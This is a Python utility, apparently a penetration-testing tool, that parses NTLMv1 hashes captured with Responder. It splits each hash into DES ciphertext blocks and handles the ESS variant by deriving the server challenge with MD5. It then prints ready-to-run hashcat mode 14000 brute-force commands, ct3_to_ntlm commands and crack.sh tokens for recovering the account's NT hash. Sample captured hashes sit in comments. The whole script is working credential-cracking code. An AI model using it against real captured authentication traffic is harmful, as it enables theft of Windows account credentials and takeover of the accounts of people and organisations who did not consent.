import hashlib,binascii
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--ntlmv1', help='NTLMv1 Hash in responder format', required=True)
parser.add_argument('--hashcat', help='hashcat path, eg: ~/git/hashcat', required=False)
parser.add_argument('--hcutils', help='hashcat-utils path, eg: ~/git/hashcat-utils', required=False)
args = parser.parse_args()
# SERVER1$::MOG:7EF3F506F5EA510E00000000000000000000000000000000:1217169BD7BE0270A033899BD440016D3E6DACAF5894D504:ff81dfd6b12c269d
# evilmog::DUSTIN-5AA37877:E343946E455EFC72746CF587C42022982F85252CC731BB25:51A539E6EE061F647CD5D48CE6C686653737C5E1DE26AC4C:1122334455667788
hashsplit = args.ntlmv1.split(':')
challenge = hashsplit[5]
lmresp = hashsplit[3]
ntresp = hashsplit[4]
ct3 = ntresp[32:48]


if lmresp[20:48] != "0000000000000000000000000000":
  ct1 = ntresp[0:16]
  ct2 = ntresp[16:32]
  ct3 = ntresp[32:48]

  print("Hashfield Split:")
  print(str(hashsplit) + "\n")

  print("Hostname: " + hashsplit[2])
  print("Username: " + hashsplit[0])
  print("Challenge: " + challenge)
  print("LM Response: " + lmresp)
  print("NT Response: " + ntresp)
  print("CT1: " + ct1)
  print("CT2: " + ct2)
  print("CT3: " + ct3 + "\n")

  print("To Calculate final 4 characters of NTLM hash use:")
  if args.hcutils:
    print(args.hcutils + "/ct3_to_ntlm.bin " + ct3 + " " + challenge + "\n")
  else:
    print("./ct3_to_ntlm.bin " + ct3 + " " + challenge + "\n")
  #./ct3_to_ntlm.bin 2e1e4bf33006ba41 cb8086049ec4736c

  print("To crack with hashcat create a file with the following contents:")
  print(ct1 + ":" + challenge)
  print(ct2 + ":" + challenge + "\n")

  print("echo \"" + ct1 + ":" + challenge + "\">>14000.hash")
  print("echo \"" + ct2 + ":" + challenge + "\">>14000.hash\n")

  print("To crack with hashcat:")
  if args.hashcat:
    print(args.hashcat + "/hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset 14000.hash ?1?1?1?1?1?1?1?1\n")
  else:
    print("./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset 14000.hash ?1?1?1?1?1?1?1?1\n")
  print("To Crack with crack.sh use the following token")
  #$NETLM$1122334455667788$0836F085B124F33895875FB1951905DD2F85252CC731BB25
  if challenge == "1122334455667788":
    print("NTHASH:" + ntresp)
  else:
    print("$NETLM$" + challenge + "$" + ntresp)

if lmresp[20:48] == "0000000000000000000000000000":
  print("Hash response is ESS, consider using responder with --lm")
  clientchallenge = hashsplit[5]
  print("[-] Client Challenge: " + clientchallenge)
  print("[-] LMResp[0:16]: " + lmresp[0:16])
  combinedchallenge = clientchallenge + lmresp[0:16]
  print("[-] Combined Challenge: " + combinedchallenge)
  m = hashlib.md5()
  m.update(binascii.unhexlify(combinedchallenge))
  md5hash = m.hexdigest()
  print ("[-] MD5 Hash of Combined Challenge: " + md5hash)
  srvchallenge = md5hash[0:16]
  ct1 = ntresp[0:16]
  ct2 = ntresp[16:32]
  print("Hashfield Split:")
  print(str(hashsplit) + "\n")

  print("Hostname: " + hashsplit[2])
  print("Username: " + hashsplit[0])
  print("LM Response: " + lmresp)
  print("NT Response: " + ntresp)
  print("SRV Challenge: " + srvchallenge + "\n")

  print("To Calculate final 4 characters of NTLM hash use:")
  # ./ct3_to_ntlm.bin 2e1e4bf33006ba41 cb8086049ec4736c 338d08f8e26de93300000000000000000000000000000000
  if args.hcutils:
    print(args.hcutils + "/ct3_to_ntlm.bin " + ct3 + " " + clientchallenge + " " + lmresp + "\n")
  else:
    print("./ct3_to_ntlm.bin " + ct3 + " " + clientchallenge + " " + lmresp + "\n")

  print("To crack with hashcat create a file with the following contents:")
  print(ct1 + ":" + srvchallenge)
  print(ct2 + ":" + srvchallenge + "\n")
  print("echo \"" + ct1 + ":" + srvchallenge + "\">>14000.hash")
  print("echo \"" + ct2 + ":" + srvchallenge + "\">>14000.hash\n")

  print("To crack with hashcat:")
  if args.hashcat:
    print(args.hashcat + "/hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset 14000.hash ?1?1?1?1?1?1?1?1\n")
  else:
    print("./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset 14000.hash ?1?1?1?1?1?1?1?1\n")

  print("To Crack with crack.sh use the following token")
  # $NETLM$1122334455667788$0836F085B124F33895875FB1951905DD2F85252CC731BB25
  print("$NETLM$" + srvchallenge + "$" + ntresp)
